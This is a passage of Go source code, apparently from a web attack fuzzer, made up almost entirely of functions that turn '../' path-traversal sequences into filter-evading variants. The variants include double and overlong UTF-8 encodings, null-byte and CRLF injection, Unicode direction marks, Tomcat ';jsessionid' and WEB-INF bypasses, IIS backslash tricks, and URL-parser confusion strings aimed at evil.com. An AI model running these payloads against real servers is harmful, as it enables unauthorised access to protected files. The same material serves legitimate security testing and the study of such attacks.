				usedEncodings[encodingIndex] = true
				break
			}

			// If we've used all encodings, break out
			if len(usedEncodings) == len(encodings) {
				break
			}
		}

		// Apply the encoding layer
		result = encodings[encodingIndex](result)
	}

	return result
}

func iisBackslashTrick(path string) string {
	// IIS backslash and dot tricks - specific to Windows/IIS servers

	if !strings.Contains(path, "../") {
		return path
	}

	options := []string{
		// Replace ../ with different IIS-specific evasions
		strings.ReplaceAll(path, "../", "..\\"),        // Simple backslash
		strings.ReplaceAll(path, "../", "..\\.\\"),     // Backslash with current dir
		strings.ReplaceAll(path, "../", "..%5c"),       // URL encoded backslash
		strings.ReplaceAll(path, "../", "..%255c"),     // Double encoded backslash
		strings.ReplaceAll(path, "../", "..%u005c"),    // Unicode backslash
		strings.ReplaceAll(path, "../", "..%5c%2e%5c"), // Encoded backslash-dot-backslash
		// IIS specific normalization issues
		strings.ReplaceAll(path, "../", "..%c0%af"),   // UTF-8 overlong slash
		strings.ReplaceAll(path, "../", "..%c0%5c"),   // UTF-8 overlong backslash
		strings.ReplaceAll(path, "../", "..\\.\\.\\"), // Multiple dot dirs
	}

	return options[rand.Intn(len(options))]
}

func apacheMultiViewBypass(path string) string {
	// Apache MultiViews bypass techniques
	// These exploit content negotiation in Apache

	// Check if we have a file path
	lastPart := path
	if strings.Contains(path, "/") {
		parts := strings.Split(path, "/")
		lastPart = parts[len(parts)-1]
	}

	// If we have what looks like a filename
	if strings.Contains(lastPart, ".") {
		filename := lastPart
		extension := ""

		// Split into filename and extension
		if dots := strings.Split(lastPart, "."); len(dots) > 1 {
			extension = dots[len(dots)-1]
			filename = strings.TrimSuffix(lastPart, "."+extension)
		}

		// Create Apache MultiViews bypass attempts
		prefix := strings.TrimSuffix(path, lastPart)

		options := []string{
			// Various MultiViews bypass techniques
			prefix + filename,                     // Filename without extension
			prefix + filename + ".",               // Filename with dot but no extension
			prefix + filename + ";",               // Filename with parameter marker
			prefix + filename + "?",               // Filename with query marker
			prefix + filename + "+." + extension,  // Content negotiation trick
			prefix + filename + "%2e" + extension, // URL encoded dot
		}

		return options[rand.Intn(len(options))]
	}

	return path
}

func tomcatBypass(path string) string {
	// Tomcat-specific bypass techniques
	// These exploit specific handling in Tomcat's URL parser

	// Check if we have a suitable path for these techniques
	if !strings.Contains(path, "../") {
		return path
	}

	options := []string{
		// Various Tomcat-specific bypasses
		strings.ReplaceAll(path, "../", ";/.."),              // Path parameter trick
		strings.ReplaceAll(path, "../", ";jsessionid=x/../"), // Session ID injection
		strings.ReplaceAll(path, "../", "%252e%252e/"),       // Double encoded
		strings.ReplaceAll(path, "../", "..;/"),              // Path parameter separator
		strings.ReplaceAll(path, "../", "../././"),           // Multiple current dir references
		strings.ReplaceAll(path, "../", "..//"),              // Double slash
		// WEB-INF access attempts if it seems like a Java web app
		strings.ReplaceAll(path, "WEB-INF", "WEB-INF;/"),            // Path parameter in sensitive dir name
		strings.ReplaceAll(path, "WEB-INF", "WEB-INF;jsessionid=x"), // Session ID in sensitive dir
	}

	return options[rand.Intn(len(options))]
}

func unicodeWidthAndDirection(path string) string {
	// Unicode width variation and direction control characters
	// These can confuse visual representation vs actual path

	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Unicode tricks for dot-dot
			options := []string{
				"\u200e..\u200e",       // Left-to-right mark
				"\u200f..\u200f",       // Right-to-left mark
				"\u200e.\u200e.\u200e", // LTR between each character
				"\u202a..\u202c",       // LTR embedding + pop
				"\u202e..\u202c",       // RTL override + pop (reverses display)
				"\uff0e\uff0e",         // Full-width dots
				"\ufe3a..\ufe39",       // Using paired brackets
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Apply similar tricks to regular path parts
			if rand.Intn(4) == 0 {
				result += "\u200e" + part + "\u200e" // Wrap in LTR marks
			} else if rand.Intn(3) == 0 {
				result += "\u202a" + part + "\u202c" // LTR embedding
			} else {
				result += part
			}
		}
	}

	return result
}

func httpHeaderFilePath(path string) string {
	// This technique is a placeholder since HTTP headers would be handled separately
	// In an actual implementation, we'd inject paths into HTTP headers

	// For representation only - in practice this would be done in HTTP header code
	headerInjections := []string{
		path,
		"file:" + path,
		"file://" + path,
		"\\" + strings.ReplaceAll(path, "/", "\\"), // Windows path style
		"/var/www/" + path,                         // Common web root
		"/usr/local/www/" + path,                   // Another common web root
		"%2e%2e%2f" + path,                         // Encoded traversal
	}

	return headerInjections[rand.Intn(len(headerInjections))]
}

func urlEncodedBackslashAtSign(path string) string {
	// URL encoded backslash followed by @ sign
	// This can confuse URL parsers into creating unexpected paths

	// Only apply to paths with traversal elements
	if !strings.Contains(path, "../") {
		return path
	}

	// Get the domain part if it exists, otherwise use a placeholder
	domainPart := ""
	if strings.Contains(path, "://") {
		parts := strings.Split(path, "://")
		if len(parts) > 1 {
			domainParts := strings.Split(parts[1], "/")
			if len(domainParts) > 0 {
				domainPart = domainParts[0]
			}
		}
	}

	if domainPart == "" {
		domainPart = "example.com" // Placeholder domain
	}

	options := []string{
		// Various backslash-@ tricks that confuse URL parsers
		"http://" + domainPart + "%5c@evil.com/" + strings.TrimPrefix(path, "../"),
		"http://" + domainPart + "%5c%5c@evil.com/" + strings.TrimPrefix(path, "../"),
		"http://user@" + domainPart + "%5c@evil.com/" + strings.TrimPrefix(path, "../"),
		"http://user:password@" + domainPart + "%5c@evil.com/" + strings.TrimPrefix(path, "../"),
	}

	return options[rand.Intn(len(options))]
}

func nonstandardEncoding(path string) string {
	// Non-standard encoding formats that might bypass filters
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			// Encode the slash in various ways
			slashOptions := []string{
				"/",      // Normal slash
				"%2f",    // URL encoded
				"%252f",  // Double encoded
				"%u002f", // Unicode encoded
				"&#47;",  // HTML entity decimal
				"&#x2F;", // HTML entity hex
				"%c0%af", // UTF-8 overlong
			}
			result += slashOptions[rand.Intn(len(slashOptions))]
		}

		if part == ".." {
			// Non-standard encodings for dots
			options := []string{
				"%2e%2e",         // URL encoded
				"%252e%252e",     // Double URL encoded
				"%u002e%u002e",   // Unicode encoded
				"&#46;&#46;",     // HTML entity decimal
				"&#x2E;&#x2E;",   // HTML entity hex
				"%c0%ae%c0%ae",   // UTF-8 overlong
				"0x2e0x2e",       // Hex literal-like encoding
				"\\u002e\\u002e", // Escaped Unicode
				"\\x2e\\x2e",     // Escaped hex
				"\\056\\056",     // Octal encoding
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Potentially encode regular path parts too
			if rand.Intn(3) == 0 {
				encoded := ""
				for _, c := range part {
					// Choose a random encoding format for each character
					format := rand.Intn(7)
					switch format {
					case 0:
						encoded += string(c) // No encoding
					case 1:
						encoded += fmt.Sprintf("%%%02x", c) // URL encoding
					case 2:
						encoded += fmt.Sprintf("&#%d;", c) // HTML decimal
					case 3:
						encoded += fmt.Sprintf("&#x%x;", c) // HTML hex
					case 4:
						encoded += fmt.Sprintf("\\u%04x", c) // Unicode escape
					case 5:
						encoded += fmt.Sprintf("\\x%02x", c) // Hex escape
					case 6:
						encoded += fmt.Sprintf("\\%03o", c) // Octal escape
					}
				}
				result += encoded
			} else {
				result += part
			}
		}
	}

	return result
}

func controlCharacterInjection(path string) string {
	// Control character injection to confuse path parsing
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Inject control characters around dots
			options := []string{
				".\u0000.", // Null byte
				".\u0007.", // Bell
				".\u0008.", // Backspace
				".\u0009.", // Tab
				".\u000B.", // Vertical tab
				".\u000C.", // Form feed
				".%00.",    // URL encoded null
				".%09.",    // URL encoded tab
				".%0A.",    // URL encoded LF
				".%0D.",    // URL encoded CR
				".%0D%0A.", // URL encoded CRLF
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Potentially inject control characters in regular parts too
			if rand.Intn(5) == 0 {
				controlChars := []string{
					"%00", // Null
					"%09", // Tab
					"%0A", // LF
					"%0D", // CR
				}

				// Insert at a random position
				if len(part) > 0 {
					pos := rand.Intn(len(part))
					char := controlChars[rand.Intn(len(controlChars))]
					result += part[:pos] + char + part[pos:]
				} else {
					result += part
				}
			} else {
				result += part
			}
		}
	}

	return result
}

func pathParameterConfusion(path string) string {
	// Path parameter confusion techniques
	parts := strings.Split(path, "/")
	result := ""

	for i, part := range parts {
		if i > 0 {
			result += "/"
		}

		if part == ".." {
			// Add path parameters to confusion normalization
			options := []string{
				"..;x=" + randomString(3),                           // Basic path parameter
				"..;name=" + randomString(5),                        // Named parameter
				"..;jsessionid=" + randomString(10),                 // Session ID parameter
				"..;x=" + randomString(3) + ";y=" + randomString(3), // Multiple parameters
				".;.;", // Only separators
				".;..", // Mixed separator and dot
				"..;",  // Trailing separator
			}
			result += options[rand.Intn(len(options))]
		} else if part != "" {
			// Add parameters to normal path segments sometimes
			if rand.Intn(4) == 0 {
				result += part + ";x=" + randomString(3)
			} else {
				result += part
			}
		}
	}

	return result
}
